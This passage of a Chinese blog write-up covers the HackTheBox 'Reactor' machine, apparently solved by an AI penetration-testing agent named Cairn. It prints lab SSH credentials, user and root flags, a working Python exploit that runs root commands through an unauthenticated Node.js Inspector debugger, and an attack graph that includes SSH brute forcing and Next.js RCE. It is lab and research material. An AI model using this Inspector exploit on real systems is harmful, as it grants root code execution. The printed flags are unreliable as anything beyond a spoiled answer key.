+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">SSH: engineer:reactor1@10.129.177.191</span></div></div><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">User Flag: f2bfc6e4f376f532051205e437497ffb</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="SSH: engineer:reactor1@10.129.177.191User Flag: f2bfc6e4f376f532051205e437497ffb"><div></div></button></div></figure></div>
+<p>Engineer 用户组：</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),108(lxd)</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),108(lxd)"><div></div></button></div></figure></div>
+<ul>
+<li><code>adm</code> 组可以读取 <code>/var/log/</code></li>
+<li><strong><code>lxd</code> 组是著名的容器提权向量</strong>（但最终走了另一条路）</li>
+</ul>
+<hr>
+<h2 id="6-权限提升nodejs-inspector-debugger-rce">6. 权限提升：Node.js Inspector Debugger RCE</h2>
+<h3 id="61-关键发现">6.1 关键发现</h3>
+<p>在 node 用户的初始 shell 中，进程列表显示了一个更有意思的目标：</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">root  1337  /usr/bin/node /opt/uptime-monitor/worker.js</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="root  1337  /usr/bin/node /opt/uptime-monitor/worker.js"><div></div></button></div></figure></div>
+<p>进一步探测发现该进程开放了一个 <strong>Node.js Inspector Debugger</strong> 端口：</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash"><code><div class="ec-line"><div class="code"><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># 从 node shell 测试</span></div></div><div class="ec-line"><div class="code"><span style="--0:#FFCB6B;--1:#8B5B12">curl</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C3E88D;--1:#566D35">http://127.0.0.1:9229/json</span></div></div><div class="ec-line"><div class="code"><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># [{"id":"...","title":"uptime-monitor","type":"node",...}]</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="curl http://127.0.0.1:9229/json"><div></div></button></div></figure></div>
+<p><strong>Inspector 进程以 root 运行，监听在 127.0.0.1:9229，无需认证。</strong></p>
+<h3 id="62-利用">6.2 利用</h3>
+<p>标准 Node.js Inspector 利用需要 WebSocket 连接，通过 <code>Runtime.evaluate</code> CDP (Chrome DevTools Protocol) 命令注入代码执行。在 ESM 环境中 <code>require()</code> 不可用，需要用 <code>process.mainModule.require()</code> 绕过：</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="python"><code><div class="ec-line"><div class="code"><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># ESM-aware inspector exploit</span></div></div><div class="ec-line"><div class="code"><span style="--0:#89DDFF;--0fs:italic;--1:#256F74;--1fs:italic">import</span><span style="--0:#EEFFFF;--1:#5A676D"> websocket</span></div></div><div class="ec-line"><div class="code"><span style="--0:#89DDFF;--0fs:italic;--1:#256F74;--1fs:italic">import</span><span style="--0:#EEFFFF;--1:#5A676D"> json</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">ws </span><span style="--0:#89DDFF;--1:#256F74">=</span><span style="--0:#EEFFFF;--1:#5A676D"> websocket</span><span style="--0:#89DDFF;--1:#256F74">.</span><span style="--0:#82AAFF;--1:#4C6690">create_connection</span><span style="--0:#89DDFF;--1:#256F74">(</span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#C3E88D;--1:#566D35">ws://127.0.0.1:9229/ws/&#x3C;session-id></span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#89DDFF;--1:#256F74">)</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># ESM bypass: 使用 process.mainModule.require 替代裸 require</span></div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">cmd </span><span style="--0:#89DDFF;--1:#256F74">=</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#C3E88D;--1:#566D35">cat /root/root.txt</span><span style="--0:#89DDFF;--1:#256F74">"</span></div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">payload </span><span style="--0:#89DDFF;--1:#256F74">=</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#89DDFF;--1:#256F74">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#C3E88D;--1:#566D35">id</span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#89DDFF;--1:#256F74">:</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#F78C6C;--1:#A64930">1</span><span style="--0:#89DDFF;--1:#256F74">,</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#C3E88D;--1:#566D35">method</span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#89DDFF;--1:#256F74">:</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#C3E88D;--1:#566D35">Runtime.evaluate</span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#89DDFF;--1:#256F74">,</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#C3E88D;--1:#566D35">params</span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#89DDFF;--1:#256F74">:</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#89DDFF;--1:#256F74">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#C3E88D;--1:#566D35">expression</span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#89DDFF;--1:#256F74">:</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#C792EA;--1:#9039C9">f</span><span style="--0:#C3E88D;--1:#566D35">"""</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#C3E88D;--1:#566D35">            </span></span><span style="--0:#C3E88D;--1:#566D35">process.mainModule.require('child_process')</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#C3E88D;--1:#566D35">            </span></span><span style="--0:#C3E88D;--1:#566D35">.execSync('</span><span style="--0:#F78C6C;--1:#A64930">{</span><span style="--0:#EEFFFF;--1:#5A676D">cmd</span><span style="--0:#F78C6C;--1:#A64930">}</span><span style="--0:#C3E88D;--1:#566D35">').toString()</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#C3E88D;--1:#566D35">        </span></span><span style="--0:#C3E88D;--1:#566D35">"""</span><span style="--0:#89DDFF;--1:#256F74">,</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#C3E88D;--1:#566D35">awaitPromise</span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#89DDFF;--1:#256F74">:</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#89DDFF;--1:#256F74">True,</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#C3E88D;--1:#566D35">returnByValue</span><span style="--0:#89DDFF;--1:#256F74">"</span><span style="--0:#89DDFF;--1:#256F74">:</span><span style="--0:#EEFFFF;--1:#5A676D"> </span><span style="--0:#89DDFF;--1:#256F74">True</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#89DDFF;--1:#256F74">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#89DDFF;--1:#256F74">}</span></div></div><div class="ec-line"><div class="code">
+</div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">ws</span><span style="--0:#89DDFF;--1:#256F74">.</span><span style="--0:#82AAFF;--1:#4C6690">send</span><span style="--0:#89DDFF;--1:#256F74">(</span><span style="--0:#82AAFF;--1:#4C6690">json</span><span style="--0:#89DDFF;--1:#256F74">.</span><span style="--0:#82AAFF;--1:#4C6690">dumps</span><span style="--0:#89DDFF;--1:#256F74">(</span><span style="--0:#82AAFF;--1:#4C6690">payload</span><span style="--0:#89DDFF;--1:#256F74">))</span></div></div><div class="ec-line"><div class="code"><span style="--0:#EEFFFF;--1:#5A676D">result </span><span style="--0:#89DDFF;--1:#256F74">=</span><span style="--0:#EEFFFF;--1:#5A676D"> ws</span><span style="--0:#89DDFF;--1:#256F74">.</span><span style="--0:#82AAFF;--1:#4C6690">recv</span><span style="--0:#89DDFF;--1:#256F74">()</span></div></div><div class="ec-line"><div class="code"><span style="--0:#979797;--0fs:italic;--1:#5A676D;--1fs:italic"># result -> "fd2b27553d387df938616182e69e2730"</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="import websocketimport jsonws = websocket.create_connection(&#x22;ws://127.0.0.1:9229/ws/<session-id>&#x22;)cmd = &#x22;cat /root/root.txt&#x22;payload = {    &#x22;id&#x22;: 1,    &#x22;method&#x22;: &#x22;Runtime.evaluate&#x22;,    &#x22;params&#x22;: {        &#x22;expression&#x22;: f&#x22;&#x22;&#x22;            process.mainModule.require(&#x27;child_process&#x27;)            .execSync(&#x27;{cmd}&#x27;).toString()        &#x22;&#x22;&#x22;,        &#x22;awaitPromise&#x22;: True,        &#x22;returnByValue&#x22;: True    }}ws.send(json.dumps(payload))result = ws.recv()"><div></div></button></div></figure></div>
+<h3 id="63-root-flag">6.3 Root Flag</h3>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">Root Flag: fd2b27553d387df938616182e69e2730</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="Root Flag: fd2b27553d387df938616182e69e2730"><div></div></button></div></figure></div>
+<p>这个提权路径绕过了常规的 LXD 容器逃逸、SUID 枚举或内核 exploit——它利用的是<strong>运维疏忽</strong>：在生产环境中将 Node.js Inspector Debugger 以 root 身份运行并暴露在 localhost 上。这在真实环境中也是常见的配置失误。</p>
+<hr>
+<h2 id="7-attack-graph--ai-agent-的决策树">7. Attack Graph —— AI Agent 的决策树</h2>
+<p>Cairn 的 Fact-Intent 图完整记录了 AI Agent 的探索路径：</p>
+<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="plaintext"><code><div class="ec-line"><div class="code"><span style="--0:#eeffff;--1:#5a676d">origin ──→ f001 (Port Scan: 22 + 3000)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">├──→ i002 → f002 (DNS/VHost: 无发现)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">├──→ i003 → f005 (Web目录爆破: 无发现)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│    i004 → f004 (手动Web探索: 静态decoy)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│    i005 → f003 (漏洞搜索: 无公开PoC)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">├──→ i008 → f006 (JS Bundle分析: 无凭据)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">├──→ i006 → f007,f009 (SSH爆破准备)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│    i007 → f008 (UDP扫描: 无服务)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│    i009 → f012 (Hydra 1,856次尝试: 零成功)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│  ★ HUMAN HINT: "SSH is WRONG, focus on Next.js CVEs" ★</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">├──→ i012 → f011 (Next.js 15.0.3 + CVE评估)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">├──→ i013 → f014 ★ CVE-2025-66478 RCE as node ★</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│    i014 → f015 (CVE-2024-56332 SSRF: blocked)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│    i015 → f013 (CVE-2024-51479: not affected)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">├──→ i016 → f018 (后利用枚举: node/engineer信息)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│    i017 → f016 ★ 凭据发现 + user flag ★</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│    i018 → f017 (横向移动调查)</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">│</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#eeffff;--1:#5a676d">  </span></span><span style="--0:#eeffff;--1:#5a676d">└──→ i019 → f019 ★ Node.js Inspector RCE as root ★</span></div></div></code></pre><div class="copy"><div aria-live="polite"></div><button title="Copy to clipboard" data-copied="Copied!" data-code="origin ──→ f001 (Port Scan: 22 + 3000)  │  ├──→ i002 → f002 (DNS/VHost: 无发现)  │  ├──→ i003 → f005 (Web目录爆破: 无发现)  │    i004 → f004 (手动Web探索: 静态decoy)  │    i005 → f003 (漏洞搜索: 无公开PoC)  │  ├──→ i008 → f006 (JS Bundle分析: 无凭据)  │  ├──→ i006 → f007,f009 (SSH爆破准备)  │    i007 → f008 (UDP扫描: 无服务)  │    i009 → f012 (Hydra 1,856次尝试: 零成功)  │  │  ★ HUMAN HINT: &#x22;SSH is WRONG, focus on Next.js CVEs&#x22; ★  │  ├──→ i012 → f011 (Next.js 15.0.3 + CVE评估)  │  ├──→ i013 → f014 ★ CVE-2025-66478 RCE as node ★  │    i014 → f015 (CVE-2024-56332 SSRF: blocked)  │    i015 → f013 (CVE-2024-51479: not affected)  │  ├──→ i016 → f018 (后利用枚举: node/engineer信息)  │    i017 → f016 ★ 凭据发现 + user flag ★  │    i018 → f017 (横向移动调查)  │  └──→ i019 → f019 ★ Node.js Inspector RCE as root ★"><div></div></button></div></figure></div>
+<p><strong>14 条 Facts、19 个 Intents、13 次 Explore 执行</strong>——这个图的规模说明即使是 Easy 难度的靶机，AI Agent 也需要相当大的探索量才能走完整个攻击链。</p>
+<hr>
+<h2 id="8-关键-takeaways">8. 关键 Takeaways</h2>
+<h3 id="81-技术层面">8.1 技术层面</h3>
+<ol>
+<li>
+<p><strong>静态页面 ≠ 安全</strong> —— ReactorWatch 的纯静态页面使目录爆破/参数注入等传统 Web 渗透技术完全失效，但 Next.js 框架层面（Server Actions + Flight Protocol）仍然存在可利用的 RCE。</p>
+</li>
+<li>
+<p><strong>Next.js 15.0.x 的 Server Actions 是一个被低估的攻击面</strong> —— CVE-2025-66478 只需要 <code>Next-Action</code> header 就能触发，不需要有效的 action ID，不需要认证，不需要任何应用层交互。</p>
+</li>
+<li>
+<p><strong>Node.js Inspector Debugger 是常见的运维失误</strong> —— <code>--inspect</code> 在默认配置下绑定 <code>127.0.0.1:9229</code> 且无需认证。在容器/本地环境下，这等同于 root shell。</p>
+</li>
+<li>
+<p><strong>MD5 哈希仍然普遍存在</strong> —— <code>reactor.db</code> 中的密码用未加盐的 MD5 存储，且 <code>reactor1</code> 这种弱口令直接暴露了通过 rockyou.txt 无法破解的局限。</p>
+</li>
+</ol>
+<h3 id="82-ai-渗透测试层面">8.2 AI 渗透测试层面</h3>
+<ol start="5">
+<li>
+<p><strong>Hint 机制是 Cairn 的核心价值</strong> —— 没有那条 “SSH is WRONG” 的提示，AI Agent 可能会在 SSH 爆破上浪费数个小时。Hint 不取代 Agent，但给 Agent 一个快速的方向纠正。这比 “human-in-the-loop” 的响应式干预更高效。</p>
+</li>
+<li>
+<p><strong>AI Agent 容易陷入 “已知路径偏执”</strong> —— 一旦所有侦察指向 “SSH 是唯一的攻击面”，Agent 会反复回到 SSH 向量上，即使之前的所有尝试都失败了。需要外部视角来打破这个循环。</p>
+</li>
+<li>
+<p><strong>并行探索 vs 序列探索</strong> —— Cairn 的并行 Explore 机制在 CVE 评估阶段表现良好（3 个 CVE 同时测试），但在早期侦察阶段，4 个 Web 分析 Intent 产生了大量重复输出（f003/f004/f005/f006 都在重复同一个结论）。</p>
+</li>
+<li>
+<p><strong>每个 Explore 阶段的 240s 超时对准确率有影响</strong> —— 多次出现 explore timeout → conclude fallback 的流程，意味着 LLM 在 4 分钟内没有完成完整执行。对于需要长时间运行的 Web 扫描、爆破任务，超时设置可能需要动态调整。</p>
+</li>
+</ol>
+<hr>
+<h2 id="9-flags">9. Flags</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Flag</th><th>值</th><th>获取方式</th></tr></thead><tbody><tr><td><strong>User</strong></td><td><code>f2bfc6e4f376f532051205e437497ffb</code></td><td>CVE-2025-66478 RCE → 凭据发现 → MD5 破解 → SSH engineer</td></tr><tr><td><strong>Root</strong></td><td><code>fd2b27553d387df938616182e69e2730</code></td><td>Node.js Inspector Debugger → CDP Runtime.evaluate → root RCE</td></tr></tbody></table>
+<hr>
+<h2 id="10-关于-cairn">10. 关于 Cairn</h2>
+<p>Cairn 是一个基于<strong>黑板架构 (Blackboard Architecture)</strong> 的通用问题求解引擎。它不定义预制的 Agent 角色或工作流，只维护一个由 Facts（已证实的客观发现）和 Intents（声明的探索方向）组成的事实图谱。Agents 通过 OODA (Observe-Orient-Decide-Act) 循环从这个共享图谱中读取任务、执行探索、写回发现。Agent 之间没有直接通信——所有协调通过共享黑板实现（Stigmergy/群体智慧）。</p>
+<p>本次渗透测试展示了 Cairn 在真实 CTF 环境中的表现：</p>
+<ul>
+<li><strong>自主发现漏洞</strong>（CVE-2025-66478）</li>
+<li><strong>完整的攻击链构造</strong>（从信息收集到凭据发现到提权）</li>
+<li><strong>人机协作的优势</strong>（Hint 机制快速纠正方向）</li>
+<li><strong>现存的局限</strong>（容易陷入局部最优解、任务超时影响效率）</li>
+</ul>
+<p>Cairn 开源地址: <a href="https://github.com/oritera/cairn">github.com/oritera/cairn</a></p>
+<hr>
+<p><em>Writeup compiled from Cairn Fact Graph (project proj_005) — all findings verified against target Reactor at 10.129.177.191.</em></p> </div> <div class="animate-in fade-in mt-12 mb-8 flex flex-wrap gap-2 duration-1000"> <a href="/tags/random" class="group flex items-center gap-1.5 rounded-xl border border-border/50 bg-muted/30 px-3 py-1.5 transition-all hover:border-primary/40 hover:bg-card"> <span class="font-mono text-xs text-primary/40 italic group-hover:text-primary">
+#
+</span> <span class="text-xs font-medium text-muted-foreground transition-colors group-hover:text-foreground"> Random </span> </a> </div> <!-- Navigation buttons --> <div class="animate-in fade-in mt-16 pt-12 border-t border-border/30 duration-1000"> <div class="grid grid-cols-2 gap-4"> <!-- Previous post --> <a href="/posts/reactor/reactor-optimization" class="group flex flex-col gap-2 rounded-lg border border-border/40 bg-muted/20 p-4 transition-all hover:border-primary/40 hover:bg-muted/40"> <div class="flex items-center gap-2 text-xs text-muted-foreground/80 group-hover:text-primary/60"> <svg width="16" height="16" viewBox="0 0 24 24" data-icon="mdi:arrow-left">   <use href="#ai:mdi:arrow-left"></use>  </svg> <span>上一篇</span> </div> <h3 class="font-semibold text-foreground group-hover:text-primary line-clamp-2"> AI写的AI渗透测试反思总结 </h3> <span class="text-xs text-muted-foreground/70"> 2026.05.25 </span> </a> <!-- Next post --> <a href="/posts/devhub/devhub" class="group flex flex-col gap-2 rounded-lg border border-border/40 bg-muted/20 p-4 transition-all hover:border-primary/40 hover:bg-muted/40 text-right"> <div class="flex items-center justify-end gap-2 text-xs text-muted-foreground/80 group-hover:text-primary/60"> <span>下一篇</span> <svg width="16" height="16" data-icon="mdi:arrow-right">   <symbol id="ai:mdi:arrow-right" viewBox="0 0 24 24"><path fill="currentColor" d="M4 11v2h12l-5.5 5.5l1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5L16 11z"/></symbol><use href="#ai:mdi:arrow-right"></use>  </svg> </div> <h3 class="font-semibold text-foreground group-hover:text-primary line-clamp-2"> HackTheBox Machine DevHub </h3> <span class="text-xs text-muted-foreground/70"> 2026.05.31 </span> </a> </div> </div> </article>  </div> </main> <!-- Left Sidebar with TOC --> <aside class="order-2 flex w-full flex-col border-t border-border bg-muted/20 p-[1.5rem] md:order-1 md:w-[20%] md:border-t-0 md:border-r md:border-b-0 md:p-[2rem]" data-pagefind-ignore="all" data-astro-cid-zm77yjld> <div class="mb-6 flex items-center gap-4 md:mb-10 md:flex-col md:items-start md:gap-0"> <div class="group flex h-14 w-14 items-center justify-center rounded-full bg-muted text-lg font-bold text-primary-foreground md:h-16 md:w-16 cursor-pointer"> <img src="/laojun.jpg" loading="eager" alt="Site logo" decoding="async" fetchpriority="auto" width="50" height="50" class="rounded-full transition-transform duration-300 group-hover:rotate-6 group-hover:scale-110"> </div> <div class="md:mt-8"> <h1 data-pagefind-ignore class="text-lg font-bold tracking-tight text-foreground md:text-xl"> N0nome </h1> <p class="mt-2 hidden text-xs text-muted-foreground/70 md:block"> 红浪漫一点都不浪漫 </p> </div> </div> <!-- TOC Section -->  <details id="mobileToc" class="mt-[1.5rem] overflow-hidden rounded-[1.25rem] border border-border/60 bg-card/70 md:hidden" data-astro-cid-zm77yjld> <summary class="toc-summary flex cursor-pointer list-none items-center justify-between gap-[0.75rem] px-[1rem] py-[0.75rem] text-[0.875rem] font-bold tracking-tight text-foreground/90" data-astro-cid-zm77yjld> <span class="flex items-center gap-[0.75rem]" data-astro-cid-zm77yjld> <span class="flex w-[1rem] flex-col gap-[0.25rem] opacity-60" data-astro-cid-zm77yjld> <span class="h-[0.09375rem] w-[1rem] rounded-full bg-primary" data-astro-cid-zm77yjld></span> <span class="h-[0.09375rem] w-[0.75rem] rounded-full bg-primary" data-astro-cid-zm77yjld></span> <span class="h-[0.09375rem] w-[1rem] rounded-full bg-primary" data-astro-cid-zm77yjld></span> </span> <span data-astro-cid-zm77yjld>Table of Contents</span> </span> <span class="toc-summary-icon text-[0.875rem] text-muted-foreground/70" data-astro-cid-zm77yjld>⌄</span> </summary> <nav class="custom-scrollbar max-h-[40vh] overflow-y-auto border-t border-border/50 px-[0.75rem] py-[0.75rem]" data-astro-cid-zm77yjld> <button onclick="window.scrollTo({ top: 0, behavior: 'smooth' })" class="mb-[0.75rem] w-full rounded-[0.75rem] px-[1rem] py-[0.625rem] text-[0.8125rem] font-bold text-foreground/80 transition-all duration-300 hover:bg-primary/5 hover:text-primary" data-astro-cid-zm77yjld>
+↑ Back to Top
+</button> <div class="flex flex-col gap-[0.25rem]" data-astro-cid-zm77yjld> <a href="#1-executive-summary" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="1-executive-summary" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 1. Executive Summary </a><a href="#2-侦察与枚举" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="2-侦察与枚举" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 2. 侦察与枚举 </a><a href="#21-端口扫描" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="21-端口扫描" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 2.1 端口扫描 </a><a href="#22-dns--vhost-枚举" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="22-dns--vhost-枚举" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 2.2 DNS / VHost 枚举 </a><a href="#23-web-应用深度分析" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="23-web-应用深度分析" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 2.3 Web 应用深度分析 </a><a href="#3-方向纠正从-ssh-爆破到-nextjs-cve" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="3-方向纠正从-ssh-爆破到-nextjs-cve" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 3. 方向纠正：从 SSH 爆破到 Next.js CVE </a><a href="#31-死胡同" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="31-死胡同" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 3.1 死胡同 </a><a href="#32-hint-注入人机协作的威力" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary ml-[1rem] text-[0.75rem] font-medium text-muted-foreground/80" data-heading="32-hint-注入人机协作的威力" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 3.2 Hint 注入——人机协作的威力 </a><a href="#4-foothold-cve-2025-66478-react2shell" class="toc-link relative rounded-[0.75rem] px-[1rem] py-[0.625rem] transition-all duration-300 hover:bg-primary/5 hover:text-primary text-[0.8125rem] font-bold text-foreground/80" data-heading="4-foothold-cve-2025-66478-react2shell" data-mobile-toc-link="true" data-astro-cid-zm77yjld> 4. Foothold: CVE-2025-66478 (React2Shell) </a><a href="#41-漏洞分析" class="toc-link relative 